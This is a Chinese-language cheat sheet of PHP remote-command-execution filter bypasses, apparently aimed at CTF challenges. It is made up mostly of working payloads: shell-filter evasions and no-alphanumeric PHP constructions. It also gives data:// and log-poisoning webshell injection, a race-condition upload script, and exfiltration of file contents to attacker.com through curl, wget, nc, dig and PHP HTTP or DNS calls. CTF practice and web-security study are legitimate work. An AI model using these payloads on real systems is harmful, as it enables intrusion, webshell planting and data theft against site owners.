# 命令执行绕过秘笈

## 📋 快速参考表

**⚠️ 重要区分 - 必须先确定漏洞类型**：

### 命令执行函数（执行shell命令）
以下函数**直接执行系统命令**，使用**shell绕过技巧**：
- `system()` - 执行系统命令并输出结果
- `exec()` - 执行系统命令
- `shell_exec()` - 通过shell执行命令
- `passthru()` - 执行系统命令并直接输出
- `popen()` - 打开进程文件指针
- `proc_open()` - 执行命令并打开文件指针
- 反引号 `` ` `` - 执行命令并返回输出

**绕过技巧**：空格绕过（`${IFS}`、`<>`）、命令分隔符（`||`、`&&`）、通配符（`?`、`*`）、环境变量（`${PATH:~A}`）、整数运算（`$(( ))`）等

### PHP代码执行函数（执行PHP代码）
以下函数**只能执行PHP代码**，使用**PHP语法绕过技巧**：
- `eval()` - 执行PHP代码字符串
- `assert()` - 断言函数，可执行PHP代码
- `create_function()` - 动态创建PHP函数
- `preg_replace()` with `/e` modifier - 执行替换字符串中的PHP代码
- `include`/`require` - 文件包含，执行被包含文件中的PHP代码

**绕过技巧**：类闭合（`};`）、反斜杠绕过、反射类、math函数（`base_convert()`）、位运算（`~`、`^`）、无参数RCE等

**⚠️ 不要混用**：
- ❌ 不能在`system()`中使用PHP语法（如`base_convert()`、`~`取反）
- ❌ 不能在`eval()`中直接使用shell命令（如`${IFS}`、`$(( ))`），必须在PHP代码中调用`system()`等命令执行函数

### 过滤空格（命令执行场景）
| 场景 | 绕过方法 |
|------|---------|
| 未过滤`$` | `${IFS}`、`$IFS$9` |
| 过滤`$` | `<>`、`%09`、花括号扩展`{cat,flag.txt}` |

### 过滤关键字（命令执行场景）
| 关键字 | 替代命令 |
|--------|---------|
| `cat` | `tac`、`rev`、`nl`、`od`、`head`、`tail`、`more`、`less` |
| `flag` | `fla\g`、`fla'g'`、`fla''g`、`fla??.php`、`fla*.php` |

### 过滤命令分隔符（命令执行场景）
| 分隔符 | 替代方法 |
|--------|---------|
| `;` | `\|\|`、`&&`、`\|`、换行符 |
| `\|` | `\|\|`、`&&`、换行符 |

### 过滤括号（PHP代码执行场景）
| 场景 | 绕过方法 |
|------|---------|
| `include` | `include $_GET[1]`（无括号） |
| `eval` | 类闭合`};`、`?>`闭合 |

### 过滤字母数字
| 场景 | 绕过方法 | 适用函数类型 |
|------|---------|------------|
| PHP代码执行 | 取反`~`、异或`^`、位运算 | `eval()`、`assert()`等 |
| Bash命令执行 | `$(( ))`整数运算、环境变量`${PATH:~A}`、通配符 | `system()`、`exec()`等 |
| Math函数（PHP代码执行） | `base_convert()`、`dechex()`异或构造 | `eval()`、`assert()`等 |

### 禁用函数绕过（PHP代码执行场景）
| 类型 | 替代方法 |
|------|---------|
| 文件读取 | `show_source()`、`highlight_file()`、`fopen()`系列 |
| 目录遍历 | `scandir()`、`glob()`、`DirectoryIterator` |
| 绕过限制 | `glob://`协议、`FFI`、`PDO load_file()` |

---

## ⚠️ 使用前必读

**在选择绕过技巧之前，必须先分析过滤规则**：

1. **识别过滤规则**：查找代码中的正则表达式、黑名单、白名单等过滤机制
2. **列出被过滤的字符**：明确哪些字符、关键字、符号被过滤
3. **检查绕过技巧适用性**：验证绕过技巧中是否包含被过滤的字符
4. **选择有效绕过方式**：如果某个技巧包含被过滤的字符，选择其他绕过方式

**⚠️ 重要说明**：
- **所有绕过方法都不局限于示例中的字符串**：
  - 示例中的`cat`、`flag`、`flag.txt`等只是演示，实际使用时可以替换为任何命令和文件名
  - 例如：`cat flag.txt`可以替换为`ls /tmp`、`whoami`、`id`等任何命令
  - 例如：`fla\g.php`可以替换为`tes\t.php`、`fil\e.txt`等任何被过滤的关键字
- **必须严格检查过滤规则**：
  - 如果过滤规则禁止了某个字符（如`\$`），则所有包含该字符的绕过方法都不可用
  - 例如：如果过滤了`\$`，则`${IFS}`、`$SHELL`、`$(...)`、`${PATH:...}`等所有包含`$`的方法都不可用
  - 必须选择不包含被过滤字符的其他方法

**关键检查点**：
- **如果过滤规则包含 `\$`**：
  - ❌ `${IFS}`、`$IFS$9`、`$SHELL`、`$(...)`、`${PATH:...}` 等所有包含`$`的方法都不可用
  - ✅ 应使用 `<>`、`%09`、花括号扩展`{cat,flag.txt}` 等不包含`$`的方法
- **如果过滤规则包含 `;`**：
  - ❌ `;` 分隔符不可用
  - ✅ 应使用 `||`、`&&`、换行符、`?>` 等
- **如果过滤规则包含 `|`**：
  - ❌ 管道符`|`、`||`不可用
  - ✅ 应使用 `&&`、换行符、`?>` 等
- **如果过滤规则包含 `*`**：
  - ❌ 通配符 `*` 不可用
  - ✅ 应使用 `?`、单引号分割`fla''g` 等

**示例**：
```php
// 过滤规则：preg_match("/\;|cat|flag| |[0-9]|\\$|\*|.../i", $c)
// 被过滤的字符：;、cat、flag、空格、数字、$、*、...

// ❌ 错误：使用 ${IFS}（包含 $ 字符，会被过滤）
tac${IFS}fla?.php

// ✅ 正确：使用 <> 重定向（不包含被过滤的字符）
tac<>fla?.php

// ✅ 正确：使用花括号扩展（不包含被过滤的字符）
{tac,fla?php}
```

---

## ⚠️ PHP代码执行 vs 命令执行 - 重要区分

**⚠️ 必须明确区分PHP代码执行函数和命令执行函数，两者使用场景和绕过技巧完全不同**：

### PHP代码执行函数（只能执行PHP代码）
以下函数**只能执行PHP代码**，不能直接执行系统命令：
- `eval()` - 执行PHP代码字符串
- `assert()` - 断言函数，可执行PHP代码
- `create_function()` - 动态创建PHP函数
- `preg_replace()` with `/e` modifier - 执行替换字符串中的PHP代码
- `call_user_func()` / `call_user_func_array()` - 调用PHP函数
- `array_map()` / `array_filter()` - 对数组元素执行PHP函数

**特点**：
- 执行的是PHP代码，不是shell命令
- 需要通过PHP代码调用命令执行函数（如`system()`、`exec()`）才能执行系统命令
- 绕过技巧主要针对PHP语法限制（如过滤括号、引号、分号等）

**示例**：
```php
// eval()执行PHP代码
eval('system("cat flag.php");');  // 在PHP代码中调用system()执行命令
eval('$a="test";');               // 纯PHP代码，不涉及命令执行

// assert()执行PHP代码
assert('system("ls")');          // 在PHP代码中调用system()执行命令
```

### 命令执行函数（可以执行系统命令）
以下函数**可以直接执行系统命令**：
- `system()` - 执行系统命令并输出结果
- `exec()` - 执行系统命令
- `shell_exec()` - 通过shell执行命令
- `passthru()` - 执行系统命令并直接输出
- `popen()` - 打开进程文件指针
- `proc_open()` - 执行命令并打开文件指针
- 反引号 `` ` `` - 执行命令并返回输出
- `pcntl_exec()` - 执行程序

**特点**：
- 直接执行shell命令，不经过PHP解释器
- 绕过技巧主要针对shell命令限制（如过滤空格、命令分隔符、关键字等）
- 可以使用shell特性（如通配符、环境变量、重定向等）

**示例**：
```php
// system()直接执行系统命令
system("cat flag.php");          // 直接执行shell命令
system("ls -la");                // 直接执行shell命令

// exec()执行系统命令
exec("cat flag.php", $output);   // 直接执行shell命令
```

### 混合场景说明
**重要**：当使用`eval()`等PHP代码执行函数时，如果要在其中执行系统命令，需要调用命令执行函数：
```php
// 场景1：eval()执行PHP代码，代码中调用system()执行命令
eval('system("cat flag.php");');
// 绕过技巧：需要同时绕过PHP代码执行限制和命令执行限制

// 场景2：system()直接执行命令
system("cat flag.php");
// 绕过技巧：只需要绕过命令执行限制
```

### 文档章节说明
- **"空格绕过技巧"、"命令分隔符绕过"、"文件读取命令替代"等章节**：适用于**命令执行函数**（`system()`、`exec()`等）
- **"eval()高级绕过"、"include无括号包含技术"、"无参数命令执行"等章节**：适用于**PHP代码执行函数**（`eval()`、`assert()`等）
- **"无字母无数字执行"、"math函数绕过"等章节**：需要根据实际场景判断是PHP代码执行还是命令执行

**⚠️ 使用建议**：
1. **先确定漏洞点**：是`eval()`等PHP代码执行函数，还是`system()`等命令执行函数？
2. **选择对应绕过技巧**：PHP代码执行使用PHP语法绕过，命令执行使用shell命令绕过
3. **不要混用**：不要将shell命令绕过技巧用于PHP代码执行场景，反之亦然

---

## 空格绕过技巧（命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`、`shell_exec()`等），利用shell的空格绕过特性，不适用于PHP代码执行函数（`eval()`、`assert()`等）。

### IFS变量替代
```bash
cat${IFS}flag.txt      # ${IFS}替代空格
cat$IFS$9flag.txt      # $9表示空格
```
**⚠️ 适用条件**：
- ✅ **适用于**：未过滤`$`字符的情况
- ❌ **不适用于**：过滤规则中包含`\$`的情况（如`preg_match("/\\$/", $c)`）
- **替代方案**：如果过滤了`$`，必须使用`<>`、`%09`或花括号扩展`{cat,flag.txt}`
- **注意**：示例中的`cat`、`flag.txt`只是演示，实际可以替换为任何命令和文件名

### Tab字符和重定向符
```bash
cat%09flag.txt         # HTTP编码的Tab (%09)
cat<>flag.txt          # 尖括号重定向作为分隔
```
**⚠️ 适用条件**：✅ 未过滤制表符或`<>` | ❌ 过滤时使用花括号扩展

### 换行符绕过
```bash
cat
flag.txt               # 换行作为分隔符
cat$'\t'flag.txt       # $'\t'表示Tab
```
**⚠️ 适用条件**：
- ✅ **换行符绕过适用于**：未过滤换行符的情况
- ❌ **`cat$'\t'flag.txt`不适用于**：过滤了`$`的情况（包含`$`字符）
- **注意**：示例中的`cat`、`flag.txt`只是演示，可以替换为任何命令和文件名

### 花括号展开
```bash
{cat,flag.txt}         # 花括号展开后执行
{cat} {flag.txt}
```
**⚠️ 适用条件**：✅ 未过滤`{`和`,` | 优势：shell层面产生空格，输入中不包含空格

## 命令分隔符绕过（命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`、`shell_exec()`等），利用shell的命令分隔符特性，不适用于PHP代码执行函数（`eval()`、`assert()`等）。

### 条件执行符
```bash
ls||cat flag.txt       # ||执行，即使前一个命令失败
ls&&cat flag.txt      # &&执行，仅在前一个命令成功时
ls;cat flag.txt       # ;顺序执行
ls|cat flag.txt       # |管道连接
```
**⚠️ 适用条件**：✅ `||`/`&&`适用于过滤`;`但未过滤`|`/`&` | ❌ 过滤时使用换行符或`?>`

### 命令分隔符绕过输出重定向
```bash
# 场景：代码中存在输出重定向（>/dev/null 2>&1）
# 原理：使用命令分隔符中断原命令，第二个命令不受重定向影响

command1||cat flag.txt      # ||绕过
command1;cat flag.txt       # ;绕过
command1|cat flag.txt       # |绕过

# 示例：system($c . " >/dev/null 2>&1")
# 绕过：$c = "sort flag.txt||"
```

### 反引号和$(...)
```bash
`cat flag.txt`         # 反引号命令替换
$(cat flag.txt)        # $()命令替换
```
**⚠️ 适用条件**：
- ❌ **如果过滤了 `\$`**：`$(...)`不可用（包含`$`字符）
- ❌ **如果过滤了反引号 `` ` ``**：反引号命令替换不可用
- ✅ **如果未过滤 `$`和反引号**：可以使用这两种方法
- **注意**：示例中的`cat flag.txt`只是演示，实际可以替换为任何命令

## 文件读取命令替代（命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`、`shell_exec()`等），使用shell命令读取文件，不适用于PHP代码执行函数（`eval()`、`assert()`等）。

### 替代cat的方法
```bash
tac flag.txt           # 倒序读取
nl flag.txt            # 显示行号
od -c flag.txt         # 八进制转储
hexdump -C flag.txt    # 十六进制显示
head -c999 flag.txt    # 显示前999字符
tail flag.txt          # 显示末尾
rev flag.txt           # 反向显示
```
**⚠️ 重要说明**：
- **这些命令可以替代任何文件读取命令**：示例中的`cat`只是演示，如果过滤了`tac`，可以使用`nl`、`od`等
- **文件名可以替换**：示例中的`flag.txt`只是演示，实际可以替换为任何文件名
- **检查命令是否被过滤**：使用前必须检查目标命令是否在过滤规则的黑名单中

### 使用less/more
```bash
less flag.txt
more flag.txt
```

## 无字母无数字执行 - PHP代码执行场景

**⚠️ 重要说明**：本节内容适用于**PHP代码执行函数**（`eval()`、`assert()`等），不适用于直接命令执行函数（`system()`、`exec()`等）。

### PHP位运算绕过（eval/assert场景）

**⚠️ 重要说明**：本节内容**仅适用于PHP代码执行函数**（`eval()`、`assert()`等），不适用于命令执行函数（`system()`、`exec()`等）。

```php
// 场景：eval()执行PHP代码，需要绕过字母数字过滤
// 取反运算符 (~)
-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)  // 等价于 system(tac f*)
// 注意：这是在eval()中执行PHP代码，代码中调用system()执行命令
// 流程：eval()执行PHP代码 → PHP代码中调用system() → system()执行shell命令

// 异或运算符 (^)
${"{{{"^"?<>/"}  // 等价于_GET
${${"{{{"^"?</"}[0]}(${"{{{"^"?<>/"}[1])  // 构造回调函数

// 位运算组合
$_=[];$_[0]=~(1|9);$_[0]($_[1]);  // 无字母数字构造变量名

// ⚠️ 重要：这些技巧只能在eval()等PHP代码执行函数中使用
// ❌ 不能在system()等命令执行函数中直接使用
// 例如：system("${{\"{{{\"^\"?<>/\"}}")  // 错误！system()不能执行PHP代码
```

### $(( ))整数运算构造数字（Bash命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`等），在Bash shell中通过整数运算构造数字，不适用于PHP代码执行函数（`eval()`、`assert()`等）。

```bash
# 基础构造（在Bash shell中执行）
$(( ))              # 0
$((~$(())))         # -1
$((~-n))            # n-1

# 构造36（需要37个$((~$(())))）
$((~$(($((~$(())))$((~$(())))...))))  # 构造36

# 示例：system("cat ".$c.".php")（命令执行场景）
# 绕过：$c = $((~$(($((~$(())))...))))  # 构造36
```
**⚠️ 适用条件**：
- ❌ **如果过滤了`\$`，此方法完全不可用**（所有`$(( ))`都包含`$`字符）
- ✅ **适用于**：命令执行函数（`system()`、`exec()`等）且未过滤`$`但过滤了数字的情况
- ❌ **不适用于**：PHP代码执行函数（`eval()`、`assert()`等）
- **注意**：示例中的`36`只是演示，可以构造任何数字

### 通配符利用（命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`等），利用Bash shell的通配符特性，不适用于PHP代码执行函数（`eval()`、`assert()`等）。

```bash
# 在命令执行场景中使用通配符
/?????/??t /???       # 匹配/bin/cat等路径
/????/??t flag.txt    # ?匹配单个字符
/bin/c?t flag.txt

# 进阶：使用*通配符
/bi?/c?t              # ?匹配一个字符
/bin/c*               # *匹配任意字符

# 组合使用
${IFS}*               # 列出所有文件（前提：未过滤 $）
${IFS}/*              # 列出根目录（前提：未过滤 $）

# 无字母绕过示例（命令执行场景）：
/???/????64 ????????  # 匹配 /bin/base64 flag.php
/???/???/????2 ????????  # 匹配 /usr/bin/bzip2 flag.php
```

**⚠️ 重要说明：`?` 通配符的使用**
- `?` 只能匹配**一个字符**，不能匹配多个字符
- `fla?.php` 可以匹配8个字符的文件名（`fla` + 1个字符 + `.php`）
- `flag.php` 是8个字符（`flag` + `.php`），所以 `fla?.php` **理论上可以匹配** `flag.php`
- `fla?.php` 中的 `?` 匹配的是 `flag.php` 中的 `g` 字符

**⚠️ 实际使用中的问题**：
- 虽然 `fla?.php` 理论上可以匹配 `flag.php`，但在某些环境中可能无法正确展开
- 可能的原因：
  1. **shell展开时机**：通配符展开可能发生在命令执行时，如果匹配失败，命令会失败
  2. **输出重定向**：`system($c." >/dev/null 2>&1")` 会将输出重定向，无法看到错误信息
  3. **环境差异**：不同shell或环境对通配符的处理可能不同

**推荐方法**：
```bash
# ✅ 推荐：使用单引号分割，fla''g.php → flag.php（绕过关键字过滤，精确匹配）
tac<>fla''g.php||

# ✅ 也可以：fla'g'.php
tac<>fla'g'.php||

# ⚠️ 不推荐：fla?.php（虽然理论上可以，但可能在实际环境中无法正确展开）
tac<>fla?.php||
```

**为什么单引号分割更可靠？**
- 不依赖shell通配符展开机制
- 精确匹配文件名，不会因为匹配失败而命令失败
- 绕过关键字过滤更稳定

### 临时文件上传绕过（条件竞争）
```bash
# 原理：POST上传文件保存在/tmp/php??????，使用通配符匹配并执行
?c=. /???/????????[@-[]

# Python脚本
import requests
url = "http://target/?c=. /???/????????[@-[]"
files = {'file': '#!/bin/sh\ncat flag.php'}
requests.post(url, files=files)
# 注意：需要条件竞争，可能需要多次尝试
```

**⚠️ 适用条件**：
- ✅ **`?` 通配符适用于**：过滤了关键字但**未过滤 `?`** 的情况
  - **限制**：`?` 只能匹配**一个字符**，需要匹配多个字符时使用多个 `?`
  - **示例**：`fla?.php` 可以匹配 `flag.php`（`?` 匹配 `g` 字符）
  - **注意**：如果过滤规则中包含关键字（如 `flag`），`fla?.php` 会被过滤，需要使用单引号分割
- ✅ **`*` 通配符适用于**：过滤了关键字但**未过滤 `*`** 的情况
  - **优势**：`*` 可以匹配**任意多个字符**
- ❌ **不适用于**：过滤规则中包含 `\*` 或 `\?` 的情况
- **检查方法**：检查过滤规则中是否包含 `\*` 或 `\?`，以及是否包含关键字本身
- **组合建议**：
  - 如果过滤了关键字（如 `flag`）但未过滤 `?`：使用 `tac<>fla''g.php`（单引号分割，推荐）
  - 如果未过滤关键字和 `?`：可以使用 `tac<>fla?.php`（`?` 匹配 `g`）
  - 如果未过滤 `$` 和 `*`：可以使用 `${IFS}fla*.php` 或 `${IFS}/*`

### 反斜杠转义绕过关键字过滤（命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`等），利用shell的反斜杠转义特性，不适用于PHP代码执行函数（`eval()`、`assert()`等）。

```bash
fla\g.php             # 反斜杠转义，绕过"flag"关键字过滤
ca\t flag.txt         # 反斜杠转义，绕过"cat"关键字过滤
sor\t flag.php        # 反斜杠转义，绕过"sort"关键字过滤

# 组合使用
nl${IFS}fla\g.php     # 反斜杠+空格（⚠️ 需要未过滤$）
tac<>fla\g.php        # 反斜杠+重定向（✅ 推荐：不依赖$）
```
**⚠️ 适用条件**：
- ✅ **适用于**：命令执行函数（`system()`、`exec()`等）且未过滤反斜杠`\`的情况
- ❌ **不适用于**：PHP代码执行函数（`eval()`、`assert()`等）
- ❌ **不适用于**：过滤规则中包含`\\`或反斜杠转义处理的情况
- **注意**：示例中的`flag`、`cat`、`sort`只是演示，此方法可以绕过任何被过滤的关键字
- **重要**：如果过滤了`$`，`nl${IFS}fla\g.php`不可用，必须使用`tac<>fla\g.php`

### 单引号分割绕过关键字过滤（命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`等），利用shell的单引号分割特性，不适用于PHP代码执行函数（`eval()`、`assert()`等）。
```bash
fla'g'.php            # 单引号分割，绕过"flag"关键字过滤
fla''g.php            # 两个连续单引号（空字符串），绕过"flag"关键字过滤
ca't' flag.txt        # 单引号分割，绕过"cat"关键字过滤

# 组合使用
nl${IFS}fla'g'.php    # 单引号+空格（⚠️ 需要未过滤$）
tac<>fla''g.php       # 两个单引号+重定向（✅ 推荐：不依赖$）
nl<fla'g'.php||       # 单引号+重定向+命令分隔符（⚠️ 需要未过滤|）
```
**⚠️ 适用条件**：✅ 未过滤单引号`'` | 原理：两个连续单引号在shell中被解析为空字符串，从而分割关键字

## 输出重定向绕过（命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`等），利用shell的重定向特性，不适用于PHP代码执行函数（`eval()`、`assert()`等）。

### 管道和重定向替代
```bash
# 在shell命令中使用重定向
cat flag.txt>&2        # 输出到stderr
cat flag.txt>file.txt  # 输出重定向
cat flag.txt|less      # 管道分页
```

### 注释绕过
```bash
# 在shell命令中使用注释
cat flag.txt#          # #后面被注释
cat flag.txt;#         # 用;隔离注释
```

## PHP代码执行函数绕过（eval/assert/create_function）

**⚠️ 重要说明**：本节内容专门针对**PHP代码执行函数**（`eval()`、`assert()`、`create_function()`等），这些函数只能执行PHP代码，不能直接执行系统命令。如果要在这些函数中执行系统命令，需要在PHP代码中调用命令执行函数（如`system()`、`exec()`）。

### 类闭合绕过
```php
// 场景：eval()执行PHP代码，但过滤了某些语法
// 漏洞：eval受限制，仅允许部分语法
eval('$a="test";');  // 允许
eval('system("ls");');  // 被过滤/不允许

// 绕过：使用类和异常闭合
eval('};system("ls");/*');
// 或
eval('Exception();system("ls");//');

// 原理：
// };关闭前面的代码块
// 执行恶意代码（在PHP代码中调用system()执行命令）
// /*将后续代码注释

// 实际场景：
eval('if($a){system("ls");}');  // 类闭合
eval('echo (system("ls"));');   // 函数嵌套
// 注意：system("ls")是在eval()执行的PHP代码中调用的命令执行函数
```

### create_function反斜杠绕过
```php
// 场景：create_function()动态创建PHP函数
// create_function用于动态创建函数
// 参数形式：create_function($args, $code)

// 漏洞：某些过滤不检查反斜杠
$func = create_function('$x', 'echo $x;');

// 绕过：使用反斜杠%5c逃逸
create_function('%5c', 'system("ls");');
# %5c是\的URL编码
# 注意：system("ls")是在create_function创建的PHP函数代码中调用的命令执行函数

// 或使用命名空间逃逸
create_function('\\', 'system("ls");');
```

### 反射类(ReflectionClass)利用
```php
// 场景：eval()执行PHP代码，利用反射API绕过限制
// 反射API能够获取类的元数据和执行方法
$class = new ReflectionClass('ctfshow');
echo $class->getFileName();  // 获取文件路径
var_dump($class);  // 输出类信息

// 绕过eval限制（PHP代码执行场景）：
eval('$r=new ReflectionClass("ctfshow");echo $r->getFileName();');

// 静态方法调用（PHP代码执行场景）：
eval('echo ctfshow::getFlag();');
// 或使用call_user_func
eval('echo call_user_func("ctfshow::getFlag");');

// 数组形式调用类方法（PHP代码执行场景）
eval('$c=ctfshow; echo $c[0]($c[1]);');  // call_user_func($c[0], $c[1])
```

### 嵌套调用绕过
```php
// 场景：eval()执行PHP代码，利用嵌套函数调用绕过限制
// 利用PHP的嵌套函数调用特性
// 如果限制了直接的system/exec调用，可尝试嵌套

eval('echo (call_user_func(call_user_func("gettext", "system"), "id"));');
// 注意：这是在eval()执行的PHP代码中，通过嵌套调用绕过对system()的直接过滤

// 或使用数组callback
eval('call_user_func(array("ctfshow", "getFlag"));');

// 层级绕过（PHP代码执行场景）
eval('$f="system"; echo $f("ls");');
// 变量变量
eval('$$v1="system"; $$v1("ls");');
```

## 无回显RCE技术

**⚠️ 重要说明**：本节内容根据不同的函数类型，使用不同的外带方法：
- **PHP代码执行函数**（`eval()`、`assert()`等）：使用PHP函数进行外带（如`file_get_contents()`、`gethostbyname()`等）
- **命令执行函数**（`system()`、`exec()`等）：使用shell命令进行外带（如`curl`、`wget`、`dig`等）

**⚠️ 不要混用**：
- ❌ 不能在`eval()`中使用shell命令（如`curl`、`dig`），必须使用PHP函数
- ❌ 不能在`system()`中使用PHP函数（如`file_get_contents()`），必须使用shell命令

### DNS外带通道

#### PHP代码执行场景
```php
// 在eval()等PHP代码执行函数中使用
// 利用DNS查询将数据外带
$data = file_get_contents('flag.php');
$hostname = base64_encode($data) . ".attacker.com";
gethostbyname($hostname);  // DNS查询触发

// 在attacker.com的DNS日志中可看到编码的数据
// base64解码恢复flag
```

#### 命令执行场景
```bash
# 在system()等命令执行函数中使用
# 使用dig或nslookup进行DNS外带
dig $(cat flag.php | base64).attacker.com
nslookup $(cat flag.php | base64).attacker.com
```

### HTTP外带通道

#### PHP代码执行场景
```php
// 在eval()等PHP代码执行函数中使用
// 使用PHP函数进行HTTP外带
$data = file_get_contents('flag.php');

// 方法1：使用file_get_contents (如果allow_url_fopen启用)
file_get_contents('http://attacker.com/?f=' . base64_encode($data));

// 方法2：使用curl_exec (如果curl扩展启用)
$ch = curl_init('http://attacker.com/collect');
curl_setopt($ch, CURLOPT_POSTFIELDS, base64_encode($data));
curl_exec($ch);
```

#### 命令执行场景
```bash
# 在system()等命令执行函数中使用
# 使用shell命令进行HTTP外带

# 方法1：curl
curl -X POST -d "flag=$(cat flag.php | base64)" http://attacker.com/collect

# 方法2：wget
wget http://attacker.com/get?data=$(cat flag.php | base64)

# 方法3：使用nc (netcat)
cat flag.php | base64 | nc attacker.com 80
```

### 文件写入获取结果

#### PHP代码执行场景
```php
// 在eval()等PHP代码执行函数中使用
// 使用PHP函数写入文件
$output = file_get_contents('flag.php');
file_put_contents('/var/www/html/result.txt', $output);
// 然后访问 http://target/result.txt 获取flag
```

#### 命令执行场景
```bash
# 在system()等命令执行函数中使用
# 使用shell命令写入文件

# 方法1：使用tee命令
cat flag.php | tee /var/www/html/output.txt

# 方法2：使用重定向
cat flag.php > /var/www/html/result.txt

# 方法3：使用cp命令
cp flag.php /var/www/html/copy.txt
```

### 盲打RCE(Time-based)

#### PHP代码执行场景
```php
// 在eval()等PHP代码执行函数中使用
// 利用时间延迟推断数据
if(substr(file_get_contents('flag.php'), 0, 1) == 'f') { 
    sleep(5); 
}
// 攻击者观察响应时间推断字符
```

#### 命令执行场景
```bash
# 在system()等命令执行函数中使用
# 利用shell命令的时间延迟推断数据

# 方法1：使用sleep命令
if [ "$(head -c 1 flag.php)" = "f" ]; then sleep 5; fi

# 方法2：使用条件执行
[ "$(head -c 1 flag.php)" = "f" ] && sleep 5
```

### 特殊命令利用（命令执行场景）

**⚠️ 重要说明**：本节内容仅适用于**命令执行函数**（`system()`、`exec()`等），不适用于PHP代码执行函数。

```bash
# tee命令：同时输出和写入文件
cat flag.php | tee /var/www/html/1.txt

# nl命令：显示行号（可替代cat展示内容）
nl flag.php | tee /var/www/html/output.txt

# od/hexdump：以特定格式显示
od -c flag.php | tee /var/www/html/dump.txt

# mv/cp：隐蔽文件操作
cp flag.php /var/www/html/copy.txt
mv flag.php /var/www/html/moved.txt

# 结合awk逐行处理
awk '{print NR, $0}' flag.php | tee /var/www/html/numbered.txt
```

## 编码和混淆技术（命令执行场景）

**⚠️ 重要说明**：本节内容适用于**命令执行函数**（`system()`、`exec()`、`shell_exec()`等），通过编码和混淆绕过shell命令过滤，不适用于PHP代码执行函数（`eval()`、`assert()`等）。

### 字符编码绕过（命令执行场景）
```bash
# 十六进制编码（在shell命令中）
\x63\x61\x74 flag.txt          # cat的十六进制
echo $'\x63\x61\x74' flag.txt  # Bash $'...' 语法

# 八进制编码（在shell命令中）
\143\141\164 flag.txt          # cat的八进制
c\141t flag.txt                # 部分编码

# URL编码（在HTTP请求中）
%63%61%74 flag.txt             # cat的URL编码

# Base64编码（在shell命令中）
echo Y2F0IGZsYWcudHh0|base64 -d|bash
```

### 引号和大小写混淆（命令执行场景）
```bash
# 在shell命令中使用引号混淆
c"a"t flag.txt                 # 双引号混用
c'a't flag.txt                 # 单引号混用
c''a''t flag.txt               # 两个连续单引号（空字符串分割）
CAT flag.txt                   # 大小写混淆（适用于大小写不敏感的系统）
Cat flag.txt
```

### 参数拆分和注入（命令执行场景）
```bash
# 在shell命令中进行参数注入
cmd -option=$(cat flag.txt)    # $(...)注入
cmd | cat flag.txt             # 管道注入
cmd < flag.txt                 # 输入重定向
cmd > flag.txt                 # 输出重定向

# 环境变量拆分（在shell命令中）
$SHELL -c 'cat flag.txt'       # 使用$SHELL
cat${PATH:0:0}flag.txt         # PATH:0:0得到空字符串
```
**⚠️ 适用条件**：
- ✅ **适用于**：命令执行函数（`system()`、`exec()`等）
- ❌ **不适用于**：PHP代码执行函数（`eval()`、`assert()`等）
- ❌ **如果过滤了 `\$`**：`$(...)`、`$SHELL`、`${PATH:...}` 等所有包含`$`的方法都不可用
- ❌ **如果过滤了 `|`**：管道注入`cmd | cat`不可用
- ✅ **如果未过滤 `$`**：可以使用`$(...)`、`$SHELL`等方法
- ✅ **如果未过滤 `|`**：可以使用管道注入
- **⚠️ 重要**：示例中的`cat`、`flag.txt`只是演示，实际可以替换为任何命令和文件名
- **⚠️ 关键**：如果正则中禁止了`\$`（如`preg_match("/\\$/", $c)`），则所有包含`$`的方法都不可用，必须选择其他方法

## include无括号包含技术（PHP代码执行场景）

**⚠️ 重要说明**：`include`/`require`是PHP文件包含函数，属于**PHP代码执行场景**，可以包含并执行PHP文件中的代码，但不能直接执行系统命令。**不适用于命令执行函数**（`system()`、`exec()`等）。

### PHP中include是语言构造，不是函数
```php
// 场景：include/require文件包含，可以执行被包含文件中的PHP代码
// include可以不使用括号
include $_GET[1];
include $file;
include "file.php";

// 绕过原理：当括号被过滤时，可以使用include无括号包含
// 利用方法：
include $_GET[1];           // 直接包含GET参数
include $_POST['file'];     // 使用POST方式
include $array[0];          // 结合数组访问

// php://filter协议利用
include "php://filter/convert.base64-encode/resource=flag.php";
// 注意：如果被包含的文件包含system()等命令执行函数调用，则可以执行系统命令
```

### data://协议利用
```php
// 场景：include/require文件包含，使用data://协议包含PHP代码
// data://协议可以将数据流作为文件包含
// 当过滤了flag关键字时，可以使用data://协议执行PHP代码

// 方法1：直接执行PHP代码（在include中执行）
?c=data://text/plain,<?php system('cat fla*');?>
// 注意：system('cat fla*')是在被include的PHP代码中调用的命令执行函数

// 方法2：使用<?=替代<?php（当过滤php关键字时）
?c=data://text/plain,<?= system('cat fla*');?>

// 方法3：使用base64编码绕过
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
// 解码后：<?php system('cat flag.php');?>
// 注意：这是在PHP代码执行场景中，通过include包含的PHP代码调用system()执行命令
```

### 默认文件后缀绕过
```php
// 当代码自动添加.php后缀时
include($c.".php");

// 绕过原理：PHP语句闭合后，后面的.php会被当成HTML直接显示
// 利用方法：
?c=data://text/plain,<?php system("cat fl*");?>
// 实际执行：data://text/plain,<?php system("cat fl*");?>.php
// 由于前面的PHP语句已经闭合，后面的.php不起作用
```

### 使用?>闭合PHP绕过分号
```php
// 当过滤了分号时，eval要求内容必须以;号结尾
// 可以使用?>作为离开PHP模式，绕过分号要求

// 利用方法：
?c=include$_POST[1]?>
// POST: 1=php://filter/read=convert.base64-encode/resource=flag.php

// 或者使用日志包含：
?c=include$_GET[1]?>&1=/var/log/nginx/access.log
// 然后通过User-Agent或Referer写入一句话木马
```

### 日志包含绕过
```php
// 当过滤了分号、括号、双引号等时，可以使用日志包含
// 原理：通过包含日志文件，将恶意代码写入日志，然后包含执行

// 步骤1：包含日志文件
?c=include$_GET[1]?>&1=/var/log/nginx/access.log

// 步骤2：通过User-Agent或Referer写入一句话木马
// User-Agent: <?php system($_GET['cmd']);?>

